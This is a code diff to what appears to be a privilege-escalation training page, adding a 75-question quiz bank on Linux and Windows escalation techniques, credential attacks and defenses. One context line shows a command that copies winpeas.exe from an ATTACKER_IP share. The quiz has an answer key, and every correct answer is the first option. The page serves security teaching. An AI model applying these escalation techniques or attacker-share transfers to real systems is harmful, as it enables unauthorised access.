@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 import LearnPageLayout from "../components/LearnPageLayout";
+import QuizSection, { QuizQuestion } from "../components/QuizSection";
 import {
   Box,
   Container,
@@ -51,6 +52,7 @@ import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
 import KeyIcon from "@mui/icons-material/Key";
 import StorageIcon from "@mui/icons-material/Storage";
 import SettingsIcon from "@mui/icons-material/Settings";
+import QuizIcon from "@mui/icons-material/Quiz";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
 import FolderIcon from "@mui/icons-material/Folder";
 import GroupIcon from "@mui/icons-material/Group";
@@ -60,7 +62,7 @@ import MemoryIcon from "@mui/icons-material/Memory";
 import DataObjectIcon from "@mui/icons-material/DataObject";
 import VpnKeyIcon from "@mui/icons-material/VpnKey";
 import PlayArrowIcon from "@mui/icons-material/PlayArrow";
-import { useNavigate } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 
 interface TabPanelProps {
   children?: React.ReactNode;
@@ -106,6 +108,987 @@ function CodeBlock({ title, code, language = "bash" }: CodeBlockProps) {
     </Paper>
   );
 }
+
+const QUIZ_QUESTION_COUNT = 10;
+const QUIZ_ACCENT_COLOR = "#f59e0b";
+
+const quizQuestions: QuizQuestion[] = [
+  {
+    id: 1,
+    topic: "Foundations",
+    question: "What is privilege escalation?",
+    options: [
+      "Gaining higher privileges than originally granted",
+      "Moving laterally between systems without new privileges",
+      "Encrypting files to evade detection",
+      "Resetting a user's password",
+    ],
+    correctAnswer: 0,
+    explanation: "Privilege escalation means obtaining permissions beyond the current level.",
+  },
+  {
+    id: 2,
+    topic: "Foundations",
+    question: "What is the difference between vertical and horizontal escalation?",
+    options: [
+      "Vertical gains higher privileges; horizontal accesses a peer account",
+      "Vertical uses Linux; horizontal uses Windows",
+      "Vertical uses network exploits; horizontal uses phishing",
+      "Vertical requires MFA; horizontal does not",
+    ],
+    correctAnswer: 0,
+    explanation: "Vertical increases privilege level, while horizontal moves between peers.",
+  },
+  {
+    id: 3,
+    topic: "Foundations",
+    question: "Why is enumeration critical before attempting escalation?",
+    options: [
+      "It reveals misconfigurations and attack paths",
+      "It guarantees root access immediately",
+      "It disables logging automatically",
+      "It patches vulnerable services",
+    ],
+    correctAnswer: 0,
+    explanation: "Enumeration uncovers weak permissions, services, and credentials to abuse.",
+  },
+  {
+    id: 4,
+    topic: "Foundations",
+    question: "The principle of least privilege means:",
+    options: [
+      "Users have only the permissions needed for their tasks",
+      "All users are local administrators",
+      "Services should run as root by default",
+      "Passwords should never expire",
+    ],
+    correctAnswer: 0,
+    explanation: "Least privilege limits access to only what is required.",
+  },
+  {
+    id: 5,
+    topic: "Linux Basics",
+    question: "What does the SUID bit do on Linux executables?",
+    options: [
+      "Executes the file with the owner's privileges",
+      "Forces the file to run in a sandbox",
+      "Makes the file read-only to all users",
+      "Disables the file from running as root",
+    ],
+    correctAnswer: 0,
+    explanation: "SUID runs the program with the file owner's effective UID.",
+  },
+  {
+    id: 6,
+    topic: "Linux Basics",
+    question: "What does SGID on a directory typically ensure?",
+    options: [
+      "New files inherit the directory group",
+      "All files become executable",
+      "The directory is hidden from non-root users",
+      "Only root can delete files",
+    ],
+    correctAnswer: 0,
+    explanation: "SGID on directories makes new files inherit the group ID.",
+  },
+  {
+    id: 7,
+    topic: "Linux Basics",
+    question: "What does `sudo -l` show?",
+    options: [
+      "Commands the user can run with sudo",
+      "All listening network ports",
+      "System uptime and load",
+      "Kernel version and modules",
+    ],
+    correctAnswer: 0,
+    explanation: "`sudo -l` lists permitted sudo commands for the current user.",
+  },
+  {
+    id: 8,
+    topic: "Linux Basics",
+    question: "Why is `NOPASSWD` in sudoers risky?",
+    options: [
+      "It allows privileged commands without a password",
+      "It breaks sudo logging",
+      "It disables all user accounts",
+      "It forces the user to reset passwords",
+    ],
+    correctAnswer: 0,
+    explanation: "NOPASSWD removes a key control for privileged command execution.",
+  },
+  {
+    id: 9,
+    topic: "Linux Basics",
+    question: "PATH hijacking occurs when:",
+    options: [
+      "A privileged program runs a command without a full path",
+      "A user changes their shell to zsh",
+      "A system uses absolute paths everywhere",
+      "The PATH variable is read-only",
+    ],
+    correctAnswer: 0,
+    explanation: "If a binary is invoked without a full path, attackers can plant a fake one earlier in PATH.",
+  },
+  {
+    id: 10,
+    topic: "Linux Basics",
+    question: "Why can cron jobs be a privilege escalation risk?",
+    options: [
+      "Writable scripts can be modified to run as root",
+      "Cron disables file permissions",
+      "Cron always runs with no logging",
+      "Cron forces all users to share passwords",
+    ],
+    correctAnswer: 0,
+    explanation: "If cron runs a writable script as root, it can be hijacked.",
+  },
+  {
+    id: 11,
+    topic: "Linux Basics",
+    question: "Linux capabilities provide:",
+    options: [
+      "Fine-grained privileges on binaries",
+      "Full root access to all users",
+      "Automatic encryption for files",
+      "A replacement for sudoers",
+    ],
+    correctAnswer: 0,
+    explanation: "Capabilities grant specific privileges without full root.",
+  },
+  {
+    id: 12,
+    topic: "Linux Basics",
+    question: "What does `cap_setuid` allow a binary to do?",
+    options: [
+      "Change its effective UID, potentially to root",
+      "Disable all network access",
+      "Create kernel modules",
+      "Modify SELinux policies",
+    ],
+    correctAnswer: 0,
+    explanation: "cap_setuid allows changing the effective UID to another user.",
+  },
+  {
+    id: 13,
+    topic: "Linux Basics",
+    question: "What does a world-writable `/etc/shadow` allow?",
+    options: [
+      "Modifying password hashes",
+      "Disabling all user accounts",
+      "Changing kernel settings",
+      "Removing SUID bits automatically",
+    ],
+    correctAnswer: 0,
+    explanation: "Writable shadow files allow attackers to set new password hashes.",
+  },
+  {
+    id: 14,
+    topic: "Linux Basics",
+    question: "When are kernel exploits typically used for escalation?",
+    options: [
+      "When a local kernel vulnerability exists",
+      "Only when no user accounts exist",
+      "When DNS is blocked",
+      "Only on macOS systems",
+    ],
+    correctAnswer: 0,
+    explanation: "Kernel exploits require a local vulnerability and access to the system.",
+  },
+  {
+    id: 15,
+    topic: "Credentials",
+    question: "Why check configuration files during enumeration?",
+    options: [
+      "They may contain plaintext credentials",
+      "They always store kernel exploits",
+      "They remove the need for enumeration",
+      "They prevent privilege escalation",
+    ],
+    correctAnswer: 0,
+    explanation: "Config files often contain secrets that can be reused.",
+  },
+  {
+    id: 16,
+    topic: "Windows Basics",
+    question: "What is UAC on Windows primarily?",
+    options: [
+      "An elevation prompt, not a full security boundary",
+      "A replacement for antivirus software",
+      "A network firewall",
+      "A kernel-level sandbox",
+    ],
+    correctAnswer: 0,
+    explanation: "UAC prompts for elevation but does not fully isolate admin context.",
+  },
+  {
+    id: 17,
+    topic: "Windows Basics",
+    question: "An unquoted service path vulnerability occurs when:",
+    options: [
+      "A service path contains spaces and is not quoted",
+      "A service uses TLS for communications",
+      "A service runs as a low-priv user",
+      "A service is disabled at boot",
+    ],
+    correctAnswer: 0,
+    explanation: "Unquoted paths allow execution of attacker-controlled binaries in path segments.",
+  },
+  {
+    id: 18,
+    topic: "Windows Basics",
+    question: "Weak service permissions allow an attacker to:",
+    options: [
+      "Replace the service binary or change its configuration",
+      "Disable all Windows updates",
+      "Encrypt the system disk by default",
+      "Change the kernel version",
+    ],
+    correctAnswer: 0,
+    explanation: "Writable service paths or configs enable binary replacement attacks.",
+  },
+  {
+    id: 19,
+    topic: "Windows Basics",
+    question: "The AlwaysInstallElevated policy allows:",
+    options: [
+      "MSI installations to run as SYSTEM",
+      "Untrusted drivers to load automatically",
+      "Users to bypass all password policies",
+      "Unsigned scripts to run as kernel code",
+    ],
+    correctAnswer: 0,
+    explanation: "AlwaysInstallElevated runs MSI packages with elevated privileges.",
+  },
+  {
+    id: 20,
+    topic: "Windows Basics",
+    question: "SeImpersonatePrivilege is commonly abused to:",
+    options: [
+      "Impersonate tokens (e.g., Potato attacks)",
+      "Disable network access",
+      "Force BitLocker encryption",
+      "Reset domain passwords",
+    ],
+    correctAnswer: 0,
+    explanation: "This privilege enables token impersonation attacks for elevation.",
+  },
+  {
+    id: 21,
+    topic: "Windows Enumeration",
+    question: "What does `whoami /priv` show?",
+    options: [
+      "Enabled privileges for the current user",
+      "All installed Windows updates",
+      "Current network connections",
+      "Local group memberships only",
+    ],
+    correctAnswer: 0,
+    explanation: "The command lists user privileges and their status.",
+  },
+  {
+    id: 22,
+    topic: "Windows Enumeration",
+    question: "What is `icacls` commonly used for?",
+    options: [
+      "Viewing file and folder ACLs",
+      "Extracting password hashes",
+      "Listing running services",
+      "Editing registry keys",
+    ],
+    correctAnswer: 0,
+    explanation: "icacls shows access control lists for files and directories.",
+  },
+  {
+    id: 23,
+    topic: "Credentials",
+    question: "Why is local admin password reuse dangerous?",
+    options: [
+      "It enables easy escalation and spread across hosts",
+      "It improves system performance",
+      "It guarantees strong passwords",
+      "It disables logging by default",
+    ],
+    correctAnswer: 0,
+    explanation: "Reuse lets attackers pivot and escalate using the same credentials.",
+  },
+  {
+    id: 24,
+    topic: "Defense",
+    question: "How does LAPS help reduce escalation risk?",
+    options: [
+      "It rotates local admin passwords uniquely per host",
+      "It disables all admin accounts",
+      "It blocks all SMB traffic",
+      "It forces 2FA for every login",
+    ],
+    correctAnswer: 0,
+    explanation: "LAPS prevents password reuse by rotating per-host admin credentials.",
+  },
+  {
+    id: 25,
+    topic: "Credentials",
+    question: "Credential dumping often targets:",
+    options: [
+      "LSASS memory or the SAM database",
+      "DNS cache entries",
+      "Browser history files only",
+      "System event logs exclusively",
+    ],
+    correctAnswer: 0,
+    explanation: "LSASS and SAM store hashes and secrets used for authentication.",
+  },
+  {
+    id: 26,
+    topic: "Linux Enumeration",
+    question: "What does `find / -perm -4000` enumerate?",
+    options: [
+      "SUID binaries",
+      "World-writable directories",
+      "Running processes",
+      "Open network ports",
+    ],
+    correctAnswer: 0,
+    explanation: "The command finds files with the SUID bit set.",
+  },
+  {
+    id: 27,
+    topic: "Linux Enumeration",
+    question: "What does `getcap -r /` list?",
+    options: [
+      "Files with Linux capabilities set",
+      "All open network sockets",
+      "All scheduled cron jobs",
+      "Loaded kernel modules",
+    ],
+    correctAnswer: 0,
+    explanation: "getcap lists binaries with assigned capabilities.",
+  },
+  {
+    id: 28,
+    topic: "Linux Abuse",
+    question: "Why is sudo access to `vim` dangerous?",
+    options: [
+      "vim can spawn a shell as root",
+      "vim disables all file permissions",
+      "vim removes audit logs automatically",
+      "vim bypasses sudo authentication forever",
+    ],
+    correctAnswer: 0,
+    explanation: "Many editors allow shell escapes when run with sudo.",
+  },
+  {
+    id: 29,
+    topic: "Linux Abuse",
+    question: "Why is sudo access to `less` or `man` risky?",
+    options: [
+      "They support shell escapes under sudo",
+      "They disable SELinux permanently",
+      "They reveal kernel source code",
+      "They remove cron jobs",
+    ],
+    correctAnswer: 0,
+    explanation: "Pager tools can execute commands when run with sudo.",
+  },
+  {
+    id: 30,
+    topic: "Linux Abuse",
+    question: "GTFOBins is best described as:",
+    options: [
+      "A catalog of binaries that can be abused for escalation",
+      "A Linux package manager",
+      "A kernel exploit framework",
+      "A Windows-only enumeration tool",
+    ],
+    correctAnswer: 0,
+    explanation: "GTFOBins documents ways to abuse common binaries.",
+  },
+  {
+    id: 31,
+    topic: "Linux Abuse",
+    question: "LD_PRELOAD abuse is possible when:",
+    options: [
+      "Environment variables are preserved for sudo",
+      "The kernel is fully patched",
+      "SUID is disabled system-wide",
+      "No shared libraries are installed",
+    ],
+    correctAnswer: 0,
+    explanation: "Preserved environment variables can allow loading malicious libraries.",
+  },
+  {
+    id: 32,
+    topic: "Linux Abuse",
+    question: "Writable `/etc/sudoers.d` allows an attacker to:",
+    options: [
+      "Add or modify sudo rules for elevation",
+      "Disable networking entirely",
+      "Reset BIOS passwords",
+      "Delete user home directories",
+    ],
+    correctAnswer: 0,
+    explanation: "Sudoers files control which commands can run with elevated rights.",
+  },
+  {
+    id: 33,
+    topic: "Linux Abuse",
+    question: "Membership in the `docker` group typically implies:",
+    options: [
+      "Root access via containers",
+      "Read-only access to logs",
+      "No ability to run containers",
+      "Automatic removal of SUID bits",
+    ],
+    correctAnswer: 0,
+    explanation: "Docker group members can mount the host filesystem from containers.",
+  },
+  {
+    id: 34,
+    topic: "Linux Abuse",
+    question: "Membership in the `lxd` group typically implies:",
+    options: [
+      "Root access via privileged containers",
+      "Read-only access to package caches",
+      "No ability to run containers",
+      "Automatic MFA enforcement",
+    ],
+    correctAnswer: 0,
+    explanation: "LXD can be abused to mount the host filesystem as root.",
+  },
+  {
+    id: 35,
+    topic: "Linux Abuse",
+    question: "What does `no_root_squash` on an NFS export allow?",
+    options: [
+      "Remote root retains root privileges on the share",
+      "All files become read-only",
+      "Only anonymous access is permitted",
+      "Encryption is enforced for all files",
+    ],
+    correctAnswer: 0,
+    explanation: "no_root_squash maps remote root to local root on the share.",
+  },
+  {
+    id: 36,
+    topic: "Windows Enumeration",
+    question: "What does `sc qc` show on Windows?",
+    options: [
+      "Service configuration and binary path",
+      "Current network routes",
+      "Installed browser extensions",
+      "All user passwords",
+    ],
+    correctAnswer: 0,
+    explanation: "sc qc reveals how a service is configured and where its binary resides.",
+  },
+  {
+    id: 37,
+    topic: "Windows Enumeration",
+    question: "What does `schtasks /query` help you find?",
+    options: [
+      "Scheduled tasks and their run contexts",
+      "Open SMB sessions",
+      "Loaded device drivers",
+      "Registry run keys only",
+    ],
+    correctAnswer: 0,
+    explanation: "It lists scheduled tasks that may run with elevated permissions.",
+  },
+  {
+    id: 38,
+    topic: "Windows Abuse",
+    question: "A misconfigured scheduled task can allow:",
+    options: [
+      "Replacing a script that runs as SYSTEM",
+      "Disabling UAC permanently",
+      "Changing kernel version on reboot",
+      "Bypassing all authentication",
+    ],
+    correctAnswer: 0,
+    explanation: "Writable task scripts or binaries can be replaced for elevation.",
+  },
+  {
+    id: 39,
+    topic: "Windows Abuse",
+    question: "DLL search order hijacking works when:",
+    options: [
+      "A program loads a DLL from a writable directory",
+      "All DLLs are signed and verified",
+      "Safe DLL search mode is enabled",
+      "Only kernel drivers are loaded",
+    ],
+    correctAnswer: 0,
+    explanation: "Writable directories in the search path allow malicious DLLs to load.",
+  },
+  {
+    id: 40,
+    topic: "Windows Abuse",
+    question: "Windows PATH hijacking allows an attacker to:",
+    options: [
+      "Execute a malicious binary earlier in the PATH",
+      "Disable all event logging",
+      "Force WinRM to use HTTPS",
+      "Reset all user passwords",
+    ],
+    correctAnswer: 0,
+    explanation: "If a program relies on PATH order, attackers can insert a fake binary.",
+  },
+  {
+    id: 41,
+    topic: "Windows Privileges",
+    question: "What does SeDebugPrivilege allow?",
+    options: [
+      "Access to other process memory such as LSASS",
+      "Changing disk encryption settings",
+      "Resetting domain admin passwords",
+      "Blocking all network traffic",
+    ],
+    correctAnswer: 0,
+    explanation: "SeDebugPrivilege enables reading and manipulating other processes.",
+  },
+  {
+    id: 42,
+    topic: "Windows Privileges",
+    question: "What does SeBackupPrivilege allow?",
+    options: [
+      "Reading protected files",
+      "Creating new domain accounts",
+      "Disabling antivirus services",
+      "Changing kernel drivers",
+    ],
+    correctAnswer: 0,
+    explanation: "Backup privilege bypasses file permission checks for reads.",
+  },
+  {
+    id: 43,
+    topic: "Windows Privileges",
+    question: "What does SeRestorePrivilege allow?",
+    options: [
+      "Writing or restoring protected files",
+      "Changing local firewall rules only",
+      "Accessing browser cookies",
+      "Resetting passwords without logs",
+    ],
+    correctAnswer: 0,
+    explanation: "Restore privilege bypasses file permission checks for writes.",
+  },
+  {
+    id: 44,
+    topic: "Windows Privileges",
+    question: "Token impersonation is:",
+    options: [
+      "Using another user's token to access resources",
+      "Changing a user's password hash",
+      "Removing a user from all groups",
+      "Encrypting a user profile",
+    ],
+    correctAnswer: 0,
+    explanation: "Impersonation uses another security token to act as that user.",
+  },
+  {
+    id: 45,
+    topic: "Windows Privileges",
+    question: "Delegation differs from impersonation because:",
+    options: [
+      "Delegation can access remote resources on behalf of a user",
+      "Delegation disables network access",
+      "Impersonation requires kernel access",
+      "Impersonation is only for Linux",
+    ],
+    correctAnswer: 0,
+    explanation: "Delegation allows credentials to be used on remote systems.",
+  },
+  {
+    id: 46,
+    topic: "Credentials",
+    question: "Why are plaintext credentials in scripts dangerous?",
+    options: [
+      "They enable immediate access without cracking",
+      "They increase system uptime",
+      "They prevent log collection",
+      "They are always encrypted automatically",
+    ],
+    correctAnswer: 0,
+    explanation: "Plaintext credentials can be reused quickly by attackers.",
+  },
+  {
+    id: 47,
+    topic: "Credentials",
+    question: "Why are exposed SSH private keys risky?",
+    options: [
+      "They can be reused to access other systems",
+      "They disable multi-factor authentication",
+      "They automatically grant domain admin",
+      "They prevent file encryption",
+    ],
+    correctAnswer: 0,
+    explanation: "Private keys allow authentication without a password.",
+  },
+  {
+    id: 48,
+    topic: "Linux Basics",
+    question: "A sudoers entry of `ALL=(ALL) ALL` means:",
+    options: [
+      "The user can run any command as any user",
+      "The user cannot use sudo at all",
+      "The user can only run read-only commands",
+      "The user can only run commands as root with a password",
+    ],
+    correctAnswer: 0,
+    explanation: "This grants full sudo access without restrictions.",
+  },
+  {
+    id: 49,
+    topic: "Linux Basics",
+    question: "What does `sudo -u` allow a user to do?",
+    options: [
+      "Run a command as another user",
+      "Disable sudo logging",
+      "Reset all passwords",
+      "Bypass file permissions for all users",
+    ],
+    correctAnswer: 0,
+    explanation: "`sudo -u` switches the target user for a command.",
+  },
+  {
+    id: 50,
+    topic: "Linux Abuse",
+    question: "What did the PwnKit (pkexec) vulnerability allow?",
+    options: [
+      "Local privilege escalation to root",
+      "Remote code execution without authentication",
+      "Automatic patching of services",
+      "Disabling all logging",
+    ],
+    correctAnswer: 0,
+    explanation: "PwnKit was a local escalation flaw in polkit's pkexec.",
+  },
+  {
+    id: 51,
+    topic: "Linux Abuse",
+    question: "Why can `sudo` access to `tar` be abused?",
+    options: [
+      "Checkpoint actions can execute arbitrary commands",
+      "tar bypasses all authentication by default",
+      "tar disables file permissions system-wide",
+      "tar encrypts the filesystem automatically",
+    ],
+    correctAnswer: 0,
+    explanation: "Certain tar options allow command execution when run with sudo.",
+  },
+  {
+    id: 52,
+    topic: "Linux Abuse",
+    question: "Why can `sudo` access to `find` be abused?",
+    options: [
+      "`-exec` can run arbitrary commands",
+      "find disables SELinux permanently",
+      "find replaces all binaries on disk",
+      "find resets sudoers files",
+    ],
+    correctAnswer: 0,
+    explanation: "The `-exec` option can run commands with elevated privileges.",
+  },
+  {
+    id: 53,
+    topic: "Windows Abuse",
+    question: "Writable service registry keys allow an attacker to:",
+    options: [
+      "Change ImagePath to a malicious binary",
+      "Disable kernel updates permanently",
+      "Reset all local passwords",
+      "Bypass BitLocker encryption",
+    ],
+    correctAnswer: 0,
+    explanation: "If service config is writable, the binary path can be hijacked.",
+  },
+  {
+    id: 54,
+    topic: "Windows Abuse",
+    question: "Weak permissions on program directories allow:",
+    options: [
+      "Replacing service binaries with malicious versions",
+      "Changing BIOS settings",
+      "Disabling firewall rules",
+      "Deleting user accounts",
+    ],
+    correctAnswer: 0,
+    explanation: "Writable program directories allow binary replacement attacks.",
+  },
+  {
+    id: 55,
+    topic: "Windows Enumeration",
+    question: "What does `net localgroup administrators` show?",
+    options: [
+      "Members of the local Administrators group",
+      "All domain users",
+      "All running processes",
+      "All network shares",
+    ],
+    correctAnswer: 0,
+    explanation: "This command lists local admin group membership.",
+  },
+  {
+    id: 56,
+    topic: "Windows Enumeration",
+    question: "What does `wmic qfe` show?",
+    options: [
+      "Installed patches and updates",
+      "Active network connections",
+      "Current user privileges",
+      "Registry autoruns",
+    ],
+    correctAnswer: 0,
+    explanation: "wmic qfe reports installed hotfixes and updates.",
+  },
+  {
+    id: 57,
+    topic: "Windows Enumeration",
+    question: "What does `net user` show?",
+    options: [
+      "Local user accounts",
+      "Open network ports",
+      "Installed drivers",
+      "Domain trust relationships",
+    ],
+    correctAnswer: 0,
+    explanation: "net user lists local accounts on the system.",
+  },
+  {
+    id: 58,
+    topic: "Windows Tools",
+    question: "PowerUp is used for:",
+    options: [
+      "Windows privilege escalation enumeration",
+      "DNS exfiltration",
+      "Kernel patching",
+      "File integrity monitoring",
+    ],
+    correctAnswer: 0,
+    explanation: "PowerUp checks for common Windows privesc misconfigurations.",
+  },
+  {
+    id: 59,
+    topic: "Windows Tools",
+    question: "Seatbelt is used for:",
+    options: [
+      "System enumeration and security posture checks",
+      "Generating phishing emails",
+      "Encrypting disks",
+      "Blocking USB devices",
+    ],
+    correctAnswer: 0,
+    explanation: "Seatbelt gathers host information to identify weaknesses.",
+  },
+  {
+    id: 60,
+    topic: "Tools",
+    question: "LinPEAS/WinPEAS are used for:",
+    options: [
+      "Automated privilege escalation enumeration",
+      "Credential vault management",
+      "Disk encryption",
+      "Firewall configuration",
+    ],
+    correctAnswer: 0,
+    explanation: "PEAS tools automate discovery of escalation vectors.",
+  },
+  {
+    id: 61,
+    topic: "Credentials",
+    question: "Kerberoasting targets:",
+    options: [
+      "Service account hashes with SPNs",
+      "Local user browser cookies",
+      "DNS cache entries",
+      "Windows update packages",
+    ],
+    correctAnswer: 0,
+    explanation: "Kerberoasting targets service account tickets for offline cracking.",
+  },
+  {
+    id: 62,
+    topic: "Credentials",
+    question: "AS-REP roasting is possible when:",
+    options: [
+      "An account does not require Kerberos pre-authentication",
+      "A user has no local profile",
+      "SMB signing is enabled",
+      "RDP is disabled",
+    ],
+    correctAnswer: 0,
+    explanation: "Accounts without pre-auth can yield AS-REP hashes for cracking.",
+  },
+  {
+    id: 63,
+    topic: "Credentials",
+    question: "Weak service account passwords can lead to:",
+    options: [
+      "Privileged access if the account is high-privilege",
+      "Automatic detection of all attacks",
+      "Removal of domain admins",
+      "Lower system uptime",
+    ],
+    correctAnswer: 0,
+    explanation: "Compromised service accounts can grant broad privileges.",
+  },
+  {
+    id: 64,
+    topic: "Credentials",
+    question: "Password spraying is:",
+    options: [
+      "Trying a few passwords across many accounts",
+      "Trying many passwords against one account",
+      "Brute-forcing the kernel",
+      "Resetting passwords via email",
+    ],
+    correctAnswer: 0,
+    explanation: "Spraying avoids lockouts by using limited guesses across users.",
+  },
+  {
+    id: 65,
+    topic: "Credentials",
+    question: "A strong password policy helps mitigate:",
+    options: [
+      "Brute force and password spraying",
+      "DNS cache poisoning",
+      "Kernel exploits",
+      "Browser extension attacks",
+    ],
+    correctAnswer: 0,
+    explanation: "Strong passwords reduce the success of guessing attacks.",
+  },
+  {
+    id: 66,
+    topic: "Defense",
+    question: "Why remove unnecessary SUID/SGID bits?",
+    options: [
+      "It reduces escalation paths",
+      "It improves DNS performance",
+      "It disables all sudo use",
+      "It enables kernel debugging",
+    ],
+    correctAnswer: 0,
+    explanation: "Fewer privileged binaries mean fewer escalation opportunities.",
+  },
+  {
+    id: 67,
+    topic: "Defense",
+    question: "Why restrict sudoers entries?",
+    options: [
+      "To limit command abuse and reduce escalation risk",
+      "To increase network bandwidth",
+      "To avoid patching",
+      "To prevent logging",
+    ],
+    correctAnswer: 0,
+    explanation: "Tight sudo policies reduce abuse of privileged commands.",
+  },
+  {
+    id: 68,
+    topic: "Defense",
+    question: "Why keep OS and applications patched?",
+    options: [
+      "To fix known local privilege escalation bugs",
+      "To disable all services",
+      "To remove the need for backups",
+      "To avoid user training",
+    ],
+    correctAnswer: 0,
+    explanation: "Patching removes known vulnerabilities used for escalation.",
+  },
+  {
+    id: 69,
+    topic: "Defense",
+    question: "Why enforce least privilege for users and services?",
+    options: [
+      "To limit the impact of a compromise",
+      "To increase CPU performance",
+      "To prevent all network access",
+      "To allow password reuse",
+    ],
+    correctAnswer: 0,
+    explanation: "Least privilege limits what attackers can do with a foothold.",
+  },
+  {
+    id: 70,
+    topic: "Defense",
+    question: "Why audit service permissions regularly?",
+    options: [
+      "To prevent binary replacement and config abuse",
+      "To disable system updates",
+      "To remove user accounts",
+      "To speed up boot times",
+    ],
+    correctAnswer: 0,
+    explanation: "Auditing finds weak permissions that enable escalation.",
+  },
+  {
+    id: 71,
+    topic: "Defense",
+    question: "Why disable unused services?",
+    options: [
+      "It reduces attack surface and escalation opportunities",
+      "It guarantees all users are admins",
+      "It removes the need for logging",
+      "It increases privileges for everyone",
+    ],
+    correctAnswer: 0,
+    explanation: "Fewer services means fewer misconfigurations to exploit.",
+  },
+  {
+    id: 72,
+    topic: "Detection",
+    question: "Monitoring for new services can help detect:",
+    options: [
+      "Service-based escalation attempts",
+      "Normal user logins",
+      "Routine backups",
+      "Software updates from vendors",
+    ],
+    correctAnswer: 0,
+    explanation: "New services are a common indicator of privilege escalation.",
+  },
+  {
+    id: 73,
+    topic: "Detection",
+    question: "Monitoring for new scheduled tasks can help detect:",
+    options: [
+      "Task-based escalation attempts",
+      "Normal patch cycles",
+      "User profile creation",
+      "DNS updates",
+    ],
+    correctAnswer: 0,
+    explanation: "Attackers often use scheduled tasks to run elevated commands.",
+  },
+  {
+    id: 74,
+    topic: "Defense",
+    question: "How does MFA on admin accounts help?",
+    options: [
+      "It reduces the impact of stolen passwords",
+      "It removes the need for patching",
+      "It disables credential dumping",
+      "It prevents all service creation",
+    ],
+    correctAnswer: 0,
+    explanation: "MFA adds an additional factor beyond a stolen password.",
+  },
+  {
+    id: 75,
+    topic: "Defense",
+    question: "Why is privilege separation important?",
+    options: [
+      "It limits the blast radius of a compromise",
+      "It forces all users to share accounts",
+      "It disables audit logging",
+      "It increases attack surface",
+    ],
+    correctAnswer: 0,
+    explanation: "Separation ensures a single compromise does less damage.",
+  },
+];
 
 export default function PrivilegeEscalationGuidePage() {
   const navigate = useNavigate();
@@ -434,9 +1417,15 @@ export default function PrivilegeEscalationGuidePage() {
     <Container maxWidth="xl" sx={{ py: 4 }}>
       {/* Header */}
       <Box sx={{ mb: 4 }}>
-        <Button startIcon={<ArrowBackIcon />} onClick={() => navigate("/learn")} sx={{ mb: 2, color: "grey.400" }}>
-          Back to Learning Hub
-        </Button>
+        <Chip
+          component={Link}
+          to="/learn"
+          icon={<ArrowBackIcon />}
+          label="Back to Learning Hub"
+          clickable
+          variant="outlined"
+          sx={{ borderRadius: 2, mb: 2 }}
+        />
         <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
           <AdminPanelSettingsIcon sx={{ fontSize: 48, color: "#ef4444" }} />
           <Box>
@@ -1939,6 +2928,39 @@ copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
           </Grid>
         </Grid>
       </TabPanel>
+      <Paper
+        id="quiz-section"
+        sx={{
+          mt: 4,
+          p: 4,
+          borderRadius: 3,
+          border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
+        }}
+      >
+        <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+          <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
+          Knowledge Check
+        </Typography>
+        <QuizSection
+          questions={quizQuestions}
+          accentColor={QUIZ_ACCENT_COLOR}
+          title="Privilege Escalation Knowledge Check"
+          description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
+          questionsPerQuiz={QUIZ_QUESTION_COUNT}
+        />
+      </Paper>
+
+      {/* Bottom Navigation */}
+      <Box sx={{ mt: 4, textAlign: "center" }}>
+        <Button
+          variant="outlined"
+          startIcon={<ArrowBackIcon />}
+          onClick={() => navigate("/learn")}
+          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
+        >
+          Back to Learning Hub
+        </Button>
+      </Box>
     </Container>
     </LearnPageLayout>
   );
